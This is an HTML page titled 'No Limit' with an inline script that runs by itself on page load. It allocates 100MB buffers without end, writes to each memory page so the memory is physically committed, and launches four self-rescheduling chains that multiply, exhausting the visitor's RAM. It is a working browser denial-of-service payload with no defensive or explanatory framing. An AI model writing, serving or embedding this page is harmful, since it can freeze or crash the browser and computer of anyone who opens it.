<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>No Limit</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
        #log { padding: 20px; font-size: 1.2em; }
    </style>
</head>
<body>
    <div id="log">Force Committing RAM...</div>
    <script>
        const blocks = [];
        const log = document.getElementById('log');

        function heavyNuke() {
            // Allocate 100MB chunks for faster impact
            const size = 100 * 1024 * 1024; 
            const buffer = new Uint8Array(size);

            // Write to every single page to force physical RAM mapping
            // This is the "Mega Nuke" default behavior
            for (let i = 0; i < buffer.length; i += 4096) {
                buffer[i] = i % 255; 
            }

            blocks.push(buffer);
            
            // Log to the UI without stopping

            // Use a combination of methods to prevent the event loop from blocking
            setTimeout(heavyNuke, 0);
            setImmediate ? setImmediate(heavyNuke) : null;
        }

        // Launch multiple "threads" of the nuke simultaneously
        for(let i = 0; i < 4; i++) {
            heavyNuke();
        }
    </script>
</body>
</html>
